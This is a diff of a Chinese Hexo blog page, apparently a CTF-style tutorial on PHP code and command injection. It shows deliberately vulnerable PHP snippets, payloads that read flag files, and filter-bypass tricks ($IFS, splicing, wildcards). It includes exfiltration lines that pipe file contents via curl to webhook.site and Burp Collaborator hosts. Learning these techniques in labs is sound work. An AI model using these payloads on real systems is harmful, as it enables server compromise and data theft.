@@ -10,19 +10,37 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="常见函数system 会回显 system(“ls”)">
+  <meta name="description" content="概念针对代码中没有过滤限制或者限制不全且能够执行用户输入恶意语句">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令执行">
 <meta property="og:url" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="zhou">
-<meta property="og:description" content="常见函数system 会回显 system(“ls”)">
+<meta property="og:description" content="概念针对代码中没有过滤限制或者限制不全且能够执行用户输入恶意语句">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/8.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/9.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/11.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/12.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/13.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/14.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/15.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/16.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/17.png">
 <meta property="article:published_time" content="2024-04-02T02:39:30.000Z">
-<meta property="article:modified_time" content="2024-08-31T12:52:16.509Z">
+<meta property="article:modified_time" content="2024-09-02T06:35:44.784Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -365,7 +383,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">118字</span>
+      <span class="post-count">1.7k字</span>
     </span>
   </span>
 
@@ -374,7 +392,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">6分</span>
     </span>
   </span>
 </div>
@@ -387,35 +405,118 @@
  
 
 	
-		<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><ul>
-<li>会回显</li>
-<li>system(“ls”)</li>
-</ul>
-<span id="more"></span>
+		<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>针对代码中没有过滤限制或者限制不全且能够执行用户输入恶意语句<span id="more"></span>，攻击者可以通过不受控制或过滤不严的输入，将恶意命令传递给系统执行，通常发生在应用程序调用系统命令时没有进行足够的输入验证。这种漏洞通常出现在使用类似 <code>exec()</code>、<code>system()</code> 或 <code>shell_exec()</code> 等函数的代码中，允许攻击者执行任意系统命令，进而控制服务器或系统。</p>
+<h3 id="相关函数漏洞分析"><a href="#相关函数漏洞分析" class="headerlink" title="相关函数漏洞分析"></a>相关函数漏洞分析</h3><h4 id="代码注入相关函数"><a href="#代码注入相关函数" class="headerlink" title="代码注入相关函数"></a>代码注入相关函数</h4><h5 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
 
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><ul>
-<li>后面不加变量只会回显最后一行，加变量时会把内容放到后面那个变量生成数组</li>
-</ul>
-<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><ul>
-<li>有回显</li>
-</ul>
-<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><ul>
-<li>执行指令，但没有回显，需要借助echo等</li>
-</ul>
-<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><ul>
-<li>执行指令，没有回显，跟shell_exec差不多</li>
-</ul>
-<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><ul>
-<li><p>两个变量</p>
-</li>
-<li><p>fgets获取内容–&gt;echo输出内容</p>
-</li>
-</ul>
-<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p>替换绕过函数过滤</p>
-<ul>
-<li>使用未被限制的函数</li>
-</ul>
-<h4 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h4>
+<p>代码中的eval()函数会把其中的字符串当成php代码执行，且此时里面的字符串由我们用户输入控制，假如我们输入的时phpinfo();，这是我们就可以查看这个环境变量了</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></p>
+<p>而如果我们此时输入的时system(‘ls’);等指令的时候，我们就能获取查看该操作系统的文件，由于我这里用的是小皮搭建的，所以无法执行system();命令，所以换成了echo来输出同目录下的flag文件来展示</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></p>
+<p>如果是linux系统可以使用下列指令获取目标文件</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>assert()函数与eval()函数有点不一样，它不会直接将里面的字符串当成代码执行，需要搭配函数使用，例如system()，如果是linux系统就可以使用上面提到的那个获取目标文件等，这里是搭建在windows上面的，所以还是使用echo来输出同目录下的flag文件演示，注意此时需要搭配上面提到的eval函数</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">eval</span>(<span class="string">&quot;echo file_get_contents(&#x27;flag.txt&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></p>
+<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+
+<p>call_user_func($a,$b);第一个参数是回调函数，第二个参数是我们要向调用函数传入的参数</p>
+<p>以下函数是不能被call_user_func函数回调的</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">array</span>() <span class="selector-tag">echo</span>() <span class="selector-tag">empty</span>() <span class="selector-tag">eval</span>() <span class="selector-tag">exit</span>() <span class="selector-tag">isset</span>() <span class="selector-tag">list</span>() <span class="selector-tag">priont</span>() <span class="selector-tag">unset</span>()</span><br></pre></td></tr></table></figure>
+
+<p>写到这查到了可以是system(“type flag,txt”);来获取文件内容（windows版本）</p>
+<p>可以先使用system(‘dir’);查询当前目录存在什么文件（windows版本）</p>
+<p>于是我们传入下面内容来获取同目录文件内容</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">func</span>=<span class="selector-tag">system</span><span class="selector-tag">&amp;</span><span class="selector-tag">cmd</span>=<span class="selector-tag">type</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
+<h5 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="selector-tag">php</span></span><br><span class="line"><span class="selector-tag">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">a</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;func&#x27;</span>]</span>;</span><br><span class="line">$<span class="selector-tag">b</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;cmd&#x27;</span>]</span>;</span><br><span class="line"><span class="selector-tag">call_user_func_array</span>($a,$b);</span><br></pre></td></tr></table></figure>
+
+<p>跟上面函数有一点点区别，这里的$b是要传入一个数组，其他是一致的，无法回调的函数也不一样，这时候只需要将第二个参数以数组形式传入就行</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">func</span>=<span class="selector-tag">system</span><span class="selector-tag">&amp;</span><span class="selector-tag">cmd</span><span class="selector-attr">[]</span>=<span class="selector-tag">type</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
+<h5 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>();</span><br></pre></td></tr></table></figure>
+
+<p>create_function(‘ ‘, $a);用来创建一个匿名函数，第一个参数是定义了一个参数，第二个参数是定义执行效果，例如此时我传入的是以下payload，他将打印出当前目录下的flag.txt文件</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">system</span>(<span class="string">&quot;type falg.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png"></p>
+<h5 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h5><p>array_map($a,$array);调用函数$a来执行$array字符串内容</p>
+<h6 id="形式一"><a href="#形式一" class="headerlink" title="形式一"></a>形式一</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="selector-tag">php</span></span><br><span class="line"><span class="selector-tag">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">a</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;func&#x27;</span>]</span>;</span><br><span class="line">$<span class="selector-tag">b</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;cmd&#x27;</span>]</span>;</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">array</span> = <span class="selector-tag">array</span>($b);</span><br><span class="line">$<span class="selector-tag">c</span> = <span class="selector-tag">array_map</span>($a,$array);</span><br></pre></td></tr></table></figure>
+
+<p>由于我们传入的$b内容已经存放进入了数组里面，所以我们正常传入字符串即可，payload如下</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">func</span>=<span class="selector-tag">system</span><span class="selector-tag">&amp;</span><span class="selector-tag">cmd</span>=<span class="selector-tag">type</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png"></p>
+<h6 id="形式二"><a href="#形式二" class="headerlink" title="形式二"></a>形式二</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="selector-tag">php</span></span><br><span class="line"><span class="selector-tag">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">a</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;func&#x27;</span>]</span>;</span><br><span class="line">$<span class="selector-tag">b</span> = $<span class="selector-tag">_POST</span><span class="selector-attr">[<span class="string">&#x27;cmd&#x27;</span>]</span>;</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">c</span> = <span class="selector-tag">array_map</span>($a,$b);</span><br></pre></td></tr></table></figure>
+
+<p>由于没有对我们传入的字符串做转化为数组的处理，所以我们需要以数组的形式传入我们的字符串</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/8.png"></p>
+<h4 id="命令注入相关函数"><a href="#命令注入相关函数" class="headerlink" title="命令注入相关函数"></a>命令注入相关函数</h4><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p>执行系统函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/9.png"></p>
+<h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p>不直接返回结果，即不会回显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="方法一–bp流量监听"><a href="#方法一–bp流量监听" class="headerlink" title="方法一–bp流量监听"></a>方法一–bp流量监听</h6><p>详细见文章<a href="http://blog.zyp0422.mom/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/">命令执行无回显-BP流量监听</a></p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png"></p>
+<h6 id="方法二–重定向到文件"><a href="#方法二–重定向到文件" class="headerlink" title="方法二–重定向到文件"></a>方法二–重定向到文件</h6><p>输出到指定文件</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">type</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span> &gt; <span class="number">1</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>再查看文件</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">url</span>/<span class="number">1</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>一般是直接下载下来那个指定的文件，由于我是自己用小皮搭建的环境，所以直接查看的</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/11.png"></p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/12.png"></p>
+<h6 id="方法三–curl外带"><a href="#方法三–curl外带" class="headerlink" title="方法三–curl外带"></a>方法三–curl外带</h6><p>这里需要使用到第三方网站这个网站可以接受我们需要查看的内容</p>
+<p>网站地址：<a target="_blank" rel="noopener" href="https://webhook.site/">webhook</a></p>
+<p>由于我这里是window系统无法成功，于是换了linux系统</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/13.png"></p>
+<p>payload</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">curl</span> <span class="selector-tag">https</span>:<span class="comment">//webhook.site/d584aa46-6d42-47b9-8ce6-0b40fb69655f/&#x27;cat flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>那串代码是网站中复制的，如果目标文件无法直接显示，可以通过| base64转化为base64形式输出</p>
+<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p>作用与system()类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/14.png"></p>
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p>还是无回显问题，仿照上面就行，这里直接使用bp流量监听演示，payload</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">type</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span> | <span class="selector-tag">curl</span> <span class="selector-tag">-d</span> @<span class="selector-tag">-</span> <span class="selector-tag">http</span>:<span class="comment">//j9t73pl3z22jyx28yij6aid9t0zqnf.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/15.png"></p>
+<h5 id="运算符"><a href="#运算符" class="headerlink" title="&#96;&#96;运算符"></a>&#96;&#96;运算符</h5><p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/16.png"></p>
+<h3 id="几种常见的绕过"><a href="#几种常见的绕过" class="headerlink" title="几种常见的绕过"></a>几种常见的绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="selector-tag">IFS</span>&#125;$<span class="number">9</span></span><br><span class="line">&#123;<span class="selector-tag">IFS</span>&#125;</span><br><span class="line">$<span class="selector-tag">IFS</span></span><br><span class="line">$&#123;<span class="selector-tag">IFS</span>&#125;</span><br><span class="line">$<span class="selector-tag">IFS</span>$<span class="number">1</span> <span class="comment">//$1改成$加其他数字貌似都行</span></span><br><span class="line">&lt; </span><br><span class="line">%<span class="number">20</span>   (space) （这里不能用）</span><br><span class="line">%<span class="number">09</span>   (tab) （这里不能用）</span><br><span class="line"><span class="selector-tag">X</span>=$&#x27;<span class="selector-tag">cat</span>\<span class="selector-tag">x09</span>./<span class="selector-tag">flag</span>&#x27;;$<span class="selector-tag">X</span>       （\<span class="selector-tag">x09</span>表示<span class="selector-tag">tab</span>，也可以用\<span class="selector-tag">x20</span>）</span><br></pre></td></tr></table></figure>
+
+<h4 id="system-绕过"><a href="#system-绕过" class="headerlink" title="system()绕过"></a>system()绕过</h4><p>可以使用以下函数绕过，注意如果用shell_exec()和exec()函数的时候记得它是无回显的，需要使用特使方法才能获取回显内容</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">passthru</span>() <span class="selector-tag">exec</span>() <span class="selector-tag">shell_exec</span>() <span class="selector-tag">popen</span>() <span class="selector-tag">proc_open</span>() <span class="selector-tag">pcntl_exec</span>() 反引号() <span class="selector-tag">shell_exec</span>()</span><br></pre></td></tr></table></figure>
+
+<h4 id="cat或者flag绕过"><a href="#cat或者flag绕过" class="headerlink" title="cat或者flag绕过"></a>cat或者flag绕过</h4><p>以下形式都只是一个例子，其他类似的形式也是ok的</p>
+<h5 id="变量拼接绕过"><a href="#变量拼接绕过" class="headerlink" title="变量拼接绕过"></a>变量拼接绕过</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>=<span class="selector-tag">c</span>;<span class="selector-tag">b</span>=<span class="selector-tag">a</span>;<span class="selector-tag">c</span>=<span class="selector-tag">t</span>;<span class="selector-tag">d</span>=<span class="selector-tag">fl</span>;<span class="selector-tag">e</span>=<span class="selector-tag">ag</span>;$<span class="selector-tag">a</span>$<span class="selector-tag">b</span>$<span class="selector-tag">c</span> $<span class="selector-tag">d</span>$<span class="selector-tag">e</span></span><br></pre></td></tr></table></figure>
+
+<p>例如上面的形式就可以绕过cat或者flag整体出现的过滤</p>
+<h5 id="单引号或双引号绕过"><a href="#单引号或双引号绕过" class="headerlink" title="单引号或双引号绕过"></a>单引号或双引号绕过</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ca</span>&#x27;&#x27;<span class="selector-tag">t</span> <span class="selector-tag">flag</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="读文件绕过（cat过滤）"><a href="#读文件绕过（cat过滤）" class="headerlink" title="读文件绕过（cat过滤）"></a>读文件绕过（cat过滤）</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure>
+
+<p>常用的是使用tac代替cat</p>
+<h5 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">c</span>\<span class="selector-tag">at</span> <span class="selector-tag">f</span>\<span class="selector-tag">lag</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="通配符绕过–”-”或”-”"><a href="#通配符绕过–”-”或”-”" class="headerlink" title="通配符绕过–”?”或”*”"></a>通配符绕过–”?”或”*”</h4><p>其中一般?代表一个字符，而*代表一串字符</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="selector-tag">at</span> <span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">cat</span> ????</span><br><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">f</span>*</span><br><span class="line"><span class="selector-tag">tac</span> <span class="selector-tag">f</span>*</span><br></pre></td></tr></table></figure>
+
+<h4 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h4><p>·命令·和$命令这两种形式都是执行命令的方法</p>
